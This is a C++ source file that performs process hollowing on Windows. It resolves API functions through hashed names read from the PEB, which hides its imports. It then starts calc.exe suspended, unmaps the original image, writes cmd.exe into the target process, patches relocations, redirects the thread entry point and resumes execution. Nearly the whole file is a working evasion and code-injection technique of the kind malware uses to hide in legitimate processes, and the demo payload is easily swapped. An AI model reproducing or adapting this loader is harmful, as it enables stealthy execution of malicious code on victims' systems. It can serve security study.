#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
//#include <windows.h>
//#include <winternl.h>
#include "IAT.hpp"			  // IAT simulator
#include "ModuleIterator.hpp" // Iterator class used to iterate over the module list
#include "CheckSumGen.hpp"    // Header file with the functions I used to generate the checksum

// Uncomment these lines below to enable debug messages, and vice-versa
//#define TRACE
//#define TRACE_PEB

template <typename T>
T retrieve_function_by_hash(unsigned long funcHash, const char* base, const wchar_t* modName) {
	// Retrieve ntHeader
	const WinDecls::IMAGE_NT_HEADERS* ntHeaders = (const WinDecls::IMAGE_NT_HEADERS*)(base + ((WinDecls::IMAGE_DOS_HEADER*)base)->e_lfanew);
	// Retrieve first entry on DATA_DIRECTORY list
	const WinDecls::IMAGE_DATA_DIRECTORY dataDir = (const WinDecls::IMAGE_DATA_DIRECTORY)(ntHeaders->OptionalHeader.DataDirectory[0]);
	// Retrieve the RVA from this entry (the first entry on DataDirectory is the EXPORT_DIRECTORY)
	const unsigned long exportDirRVA = dataDir.VirtualAddress;

	// If exportDirRVA is NULL, it means the file doesn't have an export table, that means it's probably the current module
	if (exportDirRVA == NULL) {
#if defined(TRACE)
		wprintf(L"[-] Couldn't find export directory on module \"%s\", skipping...\n", modName);
#endif
		return NULL;
	}

	// Retrieve export directory
	const WinDecls::IMAGE_EXPORT_DIRECTORY* exportDir = (const WinDecls::IMAGE_EXPORT_DIRECTORY*)(base + exportDirRVA);
	// Retrieve NumberOfNames
	unsigned long NumberOfNames = exportDir->NumberOfNames;
	// Retrieve RVA to string table
	const unsigned long RVAOfNames = exportDir->AddressOfNames;

#if defined(TRACE)
	wprintf(L"NumberOfNames in \"%s\" = %d\n", modName, NumberOfNames);
#endif
	// Iterate over the string table, comparing the strings with the one we want to find
	for (int index = NumberOfNames - 1; index >= 0; index--) {
		// Had to use reinterpret_cast here, otherwise VS wouldn't compile
		// Retrieve symbol name @ index on string table
		const char* namePtr = (const char*)(base + reinterpret_cast<const unsigned long*>(base + RVAOfNames)[index]);
		unsigned long checkSum = check_sum_gen(namePtr);

#if defined(TRACE)
		printf("[%d] = \"%s\"\n", index, namePtr);
#endif

		//Compares with our intended function
		if ( check_sum_is_eq(checkSum, funcHash) ) {
			// Retrieve pointer to ordinal Table
			const unsigned short* ordTable = (const unsigned short*)(base + exportDir->AddressOfNameOrdinals);
			// Retrieve pointer to RVA table
			const unsigned long* funcPtrTable = (const unsigned long*)(base + exportDir->AddressOfFunctions);

			// Retrieve and return function pointer
			return (T)(base + funcPtrTable[ordTable[index]]);
		}
	}
	// If no function was found, return NULL
	return NULL;
}

template <typename T>
T iterate_modules(unsigned long funcHash, ModuleIterator& iter) {
	do {
		// Retrieve module base addr
		const char* base = iter.get_base();
		// Retrieve module name
		const wchar_t* modName = iter.get_modName();

		// Looks for function inside module, and if found, return and reset iterator to base module
		// If you are patient enough you could elaborate a correct order of import so you wouldn't need to reset the iterator after every function found
		// It would drastically improve performance
		T funcPtr = retrieve_function_by_hash<T>(funcHash, base, modName);
		if (funcPtr != NULL) {
			iter.reset();
			return funcPtr;
		}

		iter.next();
	} while (iter.get_base() != NULL);

	return NULL;
}

LoadLibrary_t pLoadLibrary;
MessageBox_t  pMessageBox;
VirtualAlloc_t pVirtualAlloc;
VirtualProtect_t pVirtualProtect;
CreateProcessA_t pCreateProcessA;
GetProcAddress_t pGetProcAddress;
GetModuleHandleA_t pGetModuleHandle;
ZwUnmapViewOfSection_t pZwUnmapViewOfSection;
NtQueryInformationProcess_t pNtQueryInformationProcess;
ReadProcessMemory_t pReadProcessMemory;
CreateFileA_t pCreateFileA;
GetFileSize_t pGetFileSize;
ReadFile_t pReadFile;
HeapAlloc_t pHeapAlloc;
GetProcessHeap_t pGetProcessHeap;
VirtualAllocEx_t pVirtualAllocEx;
WriteProcessMemory_t pWriteProcessMemory;
GetThreadContext_t pGetThreadContext;
SetThreadContext_t pSetThreadContext;
ResumeThread_t pResumeThread;
CloseHandle_t pCloseHandle;

typedef struct BASE_RELOCATION_BLOCK {
	unsigned long PageAddress;
	unsigned long BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	unsigned short Offset : 12;
	unsigned short Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main(int argc, char **argv) {
	// ================ PRE-CALCULATED CHECKSUM OF NAMES OF FUNCS ================================
	// Checksum of the functions we want to retrieve
	// check_sum_gen("LoadLibraryA") = 0x8dbeba00 and so on and so forth
	const unsigned long hLoadLibraryA			   = 0x8dbeba00;
	const unsigned long hMessageBoxA			   = 0xf6c562e0;
	const unsigned long hVirtualAlloc			   = 0x10f64400;
	const unsigned long hVirtualprotect			   = 0x59664000;
	const unsigned long hCreateProcessA			   = 0xf22c4080;
	const unsigned long hGetProcAddress			   = 0x68b4800;
	const unsigned long hGetModuleHandleA		   = 0xdffe0000;
	const unsigned long hZwUnmapViewOfSection	   = 0xc9f17c00;
	const unsigned long hNtQueryInformationProcess = 0xcc874000;
	const unsigned long hReadProcessMemory		   = 0xb2a77d00;
	const unsigned long hCreateFileA			   = 0x728895c0; 
	const unsigned long hGetFileSize			   = 0x1fb6ef40; 
	const unsigned long hReadFile				   = 0xf01ce140;
	const unsigned long hHeapAlloc				   = 0x32f00000;//0x8c00e000;
	const unsigned long hGetProcessHeap			   = 0x53e78000;
	const unsigned long hVirtualAllocEx			   = 0xaf28c000;
	const unsigned long hWriteProcessMemory		   = 0x28194f00;
	const unsigned long hGetThreadContext		   = 0x29e00000;
	const unsigned long hSetThreadContext		   = 0x53600000;
	const unsigned long hResumeThread			   = 0x1ff2800;
	const unsigned long hCloseHandle			   = 0xc6272000;
	// ===========================================================================================
	
	// ========================== RETRIEVE POINTER TO LOCAL PROCESS PEB ==========================
	// Read PEB at fs:[0x30]
	const WinDecls::PEB_T* pebPtr = (WinDecls::PEB_T*)__readfsdword(0x30);
	const unsigned long baseAddr = pebPtr->ImageBaseAddress;

#if defined(TRACE_PEB)
	printf("[+] Local PEB @: %x\n", pebPtr);
	printf("[+] Local ImageBaseAddres @: %x\n", baseAddr);
#endif

	// Retrieve LDR_DATA structure
	const WinDecls::PEB_LDR_DATA_T* Ldr = pebPtr->Ldr;
	// Retrieve the first link and typecast to an entry type
	const WinDecls::LDR_DATA_TABLE_ENTRY_T* modPtr = (const WinDecls::LDR_DATA_TABLE_ENTRY_T*)(Ldr->InLoadOrderModuleList.Flink);
	// ===========================================================================================

	// =============================== RETRIEVE FUNCTION POINTERS ================================
	// Instantiate the iterator class
	ModuleIterator iter(modPtr, Ldr);

	pLoadLibrary = iterate_modules<LoadLibrary_t>(hLoadLibraryA, iter);
	pCreateProcessA = iterate_modules<CreateProcessA_t>(hCreateProcessA, iter);
	pGetProcAddress = iterate_modules<GetProcAddress_t>(hGetProcAddress, iter);
	pGetModuleHandle = iterate_modules<GetModuleHandleA_t>(hGetModuleHandleA, iter);
	pZwUnmapViewOfSection = iterate_modules<ZwUnmapViewOfSection_t>(hZwUnmapViewOfSection, iter);
	pNtQueryInformationProcess = iterate_modules<NtQueryInformationProcess_t>(hNtQueryInformationProcess, iter);
	pReadProcessMemory = iterate_modules<ReadProcessMemory_t>(hReadProcessMemory, iter);
	pCreateFileA = iterate_modules<CreateFileA_t>(hCreateFileA, iter);
	pGetFileSize = iterate_modules<GetFileSize_t>(hGetFileSize, iter);
	pReadFile = iterate_modules<ReadFile_t>(hReadFile, iter);
	pGetProcessHeap = iterate_modules<GetProcessHeap_t>(hGetProcessHeap, iter);
	pVirtualAllocEx = iterate_modules<VirtualAllocEx_t>(hVirtualAllocEx, iter);
	pWriteProcessMemory = iterate_modules<WriteProcessMemory_t>(hWriteProcessMemory, iter);
	pGetThreadContext = iterate_modules<GetThreadContext_t>(hGetThreadContext, iter);
	pSetThreadContext = iterate_modules<SetThreadContext_t>(hSetThreadContext, iter);
	pResumeThread = iterate_modules<ResumeThread_t>(hResumeThread, iter);
	pHeapAlloc = iterate_modules<HeapAlloc_t>(hHeapAlloc, iter);
	pCloseHandle = iterate_modules<CloseHandle_t>(hCloseHandle, iter);
	// ===========================================================================================

	// ====================== CREATE DESTINATION PROCESS AS SUSPENDED ============================
	unsigned long CREATESUSPENDED = 0x00000004;
	unsigned long DETACHEDPROCESS = 0x00000008;
	
	WinDecls::STARTUPINFOA* pStartupInfo = new WinDecls::STARTUPINFOA();
	pStartupInfo->dwFlags = 0x00000001;     //STARTF_USESHOWWINDOW;
	pStartupInfo->wShowWindow = 5;		   //SW_SHOW;
	WinDecls::PROCESS_INFORMATION* pProcessInfo = new WinDecls::PROCESS_INFORMATION();
	pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, 0, 0, 0, CREATESUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
	if (!pProcessInfo->hProcess) {
		printf("[-] Failed to create process\n");
		exit(1);
	}
	printf("[+] Process calc.exe created with PID: %u\n", pProcessInfo->dwProcessId);
	// ===========================================================================================

	// ===================== RETRIEVE DESTINATION PROCESS PEB BASE ADDR ==========================
	printf("[+] Querying information about the process\n");
	WinDecls::PROCESS_BASIC_INFORMATION* pBasicInfo = new WinDecls::PROCESS_BASIC_INFORMATION();
	unsigned long* retLength = NULL;
	unsigned long farProc = pNtQueryInformationProcess(pProcessInfo->hProcess, 0, pBasicInfo, sizeof(WinDecls::PROCESS_BASIC_INFORMATION), retLength);

	unsigned long remotePeb = (unsigned long)pBasicInfo->Peb;
	printf("[+] PEB of destination process is located @ %x\n", remotePeb);
	// ===========================================================================================


	// =============== READ DESTINATION PROCESS PEB AND FETCH IMAGE BASE ADDRESS =================
	char BUFF[0x2000];
	unsigned int* bytesRead = NULL;
	bool readResult = pReadProcessMemory(pProcessInfo->hProcess, (const void*)remotePeb, &BUFF, sizeof(WinDecls::PEB_T), bytesRead);

	const auto destPeb = (WinDecls::PEB_T*)BUFF;
	const unsigned long destBaseAddr = destPeb->ImageBaseAddress;
	// ===========================================================================================

	// ======================= SOURCE FILE (THE ONE TO BE EXECUTED ROUNTINE ======================
	// ==================================== READ SOURCE FILE =====================================
	unsigned long GENERICREAD = 0x80000000;
	unsigned long OPENALWAYS  = 0x4;
	void* sourceFile = pCreateFileA("C:\\Windows\\System32\\cmd.exe", GENERICREAD, NULL, NULL, OPENALWAYS, NULL, NULL);
	unsigned int sourceFileSize = pGetFileSize(sourceFile, NULL);
	unsigned long* fileBytesRead = 0;
	// ===========================================================================================
	
	// ======================= READ SOURCE FILE CONTENTS INTO LOCAL HEAP =========================
	unsigned long HEAPZEROMEMORY = 0x00000008;
	char* h = (char*)pGetProcessHeap();
	void* sourceFileBytesBuffer = pHeapAlloc(h, HEAPZEROMEMORY, sourceFileSize);
	pReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
	
	WinDecls::IMAGE_DOS_HEADER* sourceImageDosHeader = (WinDecls::IMAGE_DOS_HEADER*)sourceFileBytesBuffer;
	WinDecls::IMAGE_NT_HEADERS* sourceImageNTHeaders = (WinDecls::IMAGE_NT_HEADERS*)((char *)sourceFileBytesBuffer + sourceImageDosHeader->e_lfanew);
	
	unsigned int sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
	// ===========================================================================================

	// ========================== CARVE OUT DESTINATION PROCESS IMAGE ============================
	pZwUnmapViewOfSection(pProcessInfo->hProcess, (char *)destBaseAddr);
	// ===========================================================================================

	// ================ ALLOCATE MEMORY IN DESTINATION IMAGE FOR SOURCE IMAGE ====================
	unsigned long MEMCOMMIT  = 0x00001000;
	unsigned long MEMRESERVE = 0x00002000;
	unsigned long PAGEEXECUTEREADWRITE = 0x40;
	void* newDestImageBase = pVirtualAllocEx(pProcessInfo->hProcess, (char *)destBaseAddr, sourceImageSize, MEMCOMMIT | MEMRESERVE, PAGEEXECUTEREADWRITE);

	char* destImageBase = (char *)newDestImageBase;
	// ===========================================================================================
	
	// ============== CALCULATE DELTA BETWEEN SOURCE AND DESTINATION BASE ADDRESS ================
	char* deltaImageBase = destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;
	// ===========================================================================================

	// ========================== COPY SOURCE HEADERS INTO DESTINATION ===========================
	sourceImageNTHeaders->OptionalHeader.ImageBase = (unsigned long)destImageBase;
	pWriteProcessMemory(pProcessInfo->hProcess, destImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
	// ===========================================================================================
	
	// ===================== RETRIEVE POINTER TO THE FIRST SECTION OF SOURCE =====================
	WinDecls::IMAGE_SECTION_HEADER* sourceImageSection = (WinDecls::IMAGE_SECTION_HEADER*)((unsigned long)sourceFileBytesBuffer + sourceImageDosHeader->e_lfanew + sizeof(WinDecls::IMAGE_NT_HEADERS));
	WinDecls::IMAGE_SECTION_HEADER* sourceImageSectionOld = sourceImageSection;
	// ===========================================================================================

	// ========================= COPY SOURCE SECTIONS OVER TO DESTINATION ========================
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
		void* destinationSectionLocation = (void*)((unsigned long)destImageBase + sourceImageSection->VirtualAddress);
		void* sourceSectionLocation = (void*)((unsigned long)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		pWriteProcessMemory(pProcessInfo->hProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}
	// ===========================================================================================

	// ===================== PATCH THE BINARY WITH THE NEW RELOCATION TABLE ======================
	int IMAGEDIRECTORY_ENTRY_BASERELOC = 5;
	WinDecls::IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGEDIRECTORY_ENTRY_BASERELOC];
	// Resets pointer to the first section of source image
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
		// Searching for the .reloc section
		char* relocSectionName = (char*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) {
			sourceImageSection++;
			continue;
		}

		unsigned long sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		unsigned long relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((unsigned long)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			unsigned long relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((unsigned long)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (unsigned long j = 0; j < relocationEntryCount; j++) {
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
				
				if (relocationEntries[j].Type == 0) {
					continue;
				}

				unsigned long patchAddress = relocationBlock->PageAddress + relocationEntries[j].Offset;
				unsigned long patchedBuffer = 0;
				pReadProcessMemory(pProcessInfo->hProcess, (destImageBase + patchAddress), &patchedBuffer, sizeof(unsigned long), NULL);
				patchedBuffer += (unsigned long)deltaImageBase;

				pWriteProcessMemory(pProcessInfo->hProcess, (destImageBase + patchAddress), &patchedBuffer, sizeof(unsigned long), NULL);
			}
		}
	}
	// ===========================================================================================
	
	// ======================= SET NEW CONTEXT FOR THE DESTINATION PROCESS =======================
	WinDecls::CONTEXT* context = new WinDecls::CONTEXT();
	unsigned long CONTEXTINTEGER = 0x00010000L | 0x00000002L;
	context->ContextFlags = CONTEXTINTEGER;
	// First it's necessary to fetch the current context of the process
	pGetThreadContext(pProcessInfo->hThread, context);

	// Patch destination process' entrypoint
	unsigned long patchedEntryPoint = (unsigned long)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Eax = patchedEntryPoint;
	pSetThreadContext(pProcessInfo->hThread, context);
	pResumeThread(pProcessInfo->hThread);
	// ===========================================================================================

	// ================================ CLOSE THE OPENED HANDLES =================================
	pCloseHandle(pProcessInfo->hProcess);
	pCloseHandle(sourceFile);
	// ===========================================================================================

	printf("end\n");

	return 0;
}
